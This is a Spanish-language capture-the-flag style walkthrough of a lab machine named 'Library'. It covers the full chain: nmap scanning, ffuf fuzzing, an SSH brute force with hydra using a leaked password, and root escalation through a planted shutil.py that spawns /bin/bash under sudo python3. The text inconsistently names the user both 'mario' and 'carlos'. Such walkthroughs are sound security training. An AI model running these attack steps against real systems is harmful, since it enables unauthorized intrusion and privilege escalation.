### Informe de máquina *"Library"*

![Máquina Library](../../data/facil/library/screenshots/01_machine.png)

Vamos a realizar la maquina "Library", como siempre vamos a empezar asignando permisos de ejecución al archivo `auto_deploy.sh` eh inicializamos la maquina con `sudo ./autodeploy ` `library.tar`

![Permisos ejecución deploy](../../data/facil/library/screenshots/02_execution_perms_deploy.png)
![Inicialización máquina](../../data/facil/library/screenshots/03_run_machine.png)

Realizamos un testeo de conexión con el comando `ping`.

![Test de conexión](../../data/facil/library/screenshots/04_ping.png)

Y realizamos un escaneo de puertos abiertos con la herramienta `nmap`, el comando usado fue:

```bash
nmap -sS --min-rate 5000 -p- -vvv -Pn -n 172.17.0.2 -oG nmap
```

- `nmap` → Comando para ejecutar herramienta nmap.
- `-sS` → Escaneo SYN ("Stealth Scan"). Envía paquetes SYN sin completar la conexión TCP (más rápido y sigiloso que -sT).
- `--min-rate 5000` → Fuerza a nmap a enviar al menos 5000 paquetes por segundo, acelerando el escaneo.
- `-p-` → Escanea todos los 65535 puertos (en lugar de solo los más comunes).
- `-vvv` → Modo muy detallado (muestra más información en pantalla mientras se ejecuta).
- `-Pn` → No realiza detección de host (asume que el host está activo y no envía ping previo).
- `-n` → No resuelve nombres de dominio (evita consultas DNS, lo que acelera el escaneo).
- `172.17.0.2` → IP objetivo a escanear.
- `-oG nmap` → Guarda los resultados en formato "greppable" en un archivo llamado nmap.

![Escaneo nmap](../../data/facil/library/screenshots/05_nmap.png)

Encontramos los puertos `22` y `80` abiertos, procedemos a realizar un escaneo más detallada de estos.

```bash
nmap -p22,80 -sC -sV -O 172.17.0.2
```

- `nmap` → Ejecuta la herramienta de escaneo de red Nmap.

- `-p22,80` → Especifica los puertos que queremos escanear. En este caso 22 y 80.

- `-sC` → Ejecuta scripts de detección predeterminados

- `-sV` → Detección de versiones de servicios.

- `-O` → Detección del sistema operativo.

- `172.17.0.2` → Especifica la dirección IP del objetivo a escanear.

![Detalle puertos 22 y 80](../../data/facil/library/screenshots/06_detail_ports_22_80.png)

Continuamos a revisar que encontramos en la página web de inicio.

![Página web](../../data/facil/library/screenshots/07_web_page.png)

No se encuentra mucha información, solo la página por defecto de servidor Apache 2.
Procedemos a realizar un ataque de fuzzing al servidor web.

```bash
ffuf -u http://172.17.0.2/FUZZ -w /usr/share/wordlists/dirb/big.txt -t 20 -e .php,.txt,.html,.php.bak
```

![Fuzzing servidor web](../../data/facil/library/screenshots/08_fuzzing_page.png)

Encontramos que existe también un archivo llamado "index.php"

![Página index.php](../../data/facil/library/screenshots/09_index_php.png)

Encontramos un texto que dice `JIFGHDS87GYDFIGD` suponemos que es una posible contraseña de algún usuario del servidor.

Realizamos un ataque de fuerza bruta en búsqueda de un usuario que coincida con esa contraseña

```bash
hydra -L /usr/share/wordlists/john.lst -p "JIFGHDS87GYDFIGD"  ssh://172.17.0.2 -t 10
```

![Fuerza bruta con password](../../data/facil/library/screenshots/10_find_user_carlos.png)

Accedemos al servidor por ssh con el usuario mario.
Revisamos que binarios puede ejecutar con permisos sudo con el comando `sudo -l`

![Login como carlos](../../data/facil/library/screenshots/11_login_as_carlos.png)

Encontramos que puede usar el binario python3 con privilegios hacia el archivo `/opt/script.py`.

![Permisos con privilegios mario](../../data/facil/library/screenshots/12_sudo_perms.png)

Ejecutando `cat` a ese archivo vemos que importa una librería llamada `shutil`.
Podemos crear un archivo en ese mismo directorio `/opt` con ese mismo nombre con extensión py.
Consultamos como ejecutar una shell con python en [GTFOBins](https://gtfobins.github.io/)

![Busqueda de shell con python](../../data/facil/library/screenshots/13_find_shell_python.png)

Con el comando `nano /opt/shutil.py` editamos nuestro archivo de la siguiente forma:

```python
import os
os.system("/bin/bash")
```

Guardamos el archivo.
Ahora ejecutamos el comando `sudo python3 /opt/script.py` y se nos inicia una shell, donde ejecutando el comando `whoami` observamos que somos usuarios `root`

![Login como root](../../data/facil/library/screenshots/14_root.png)
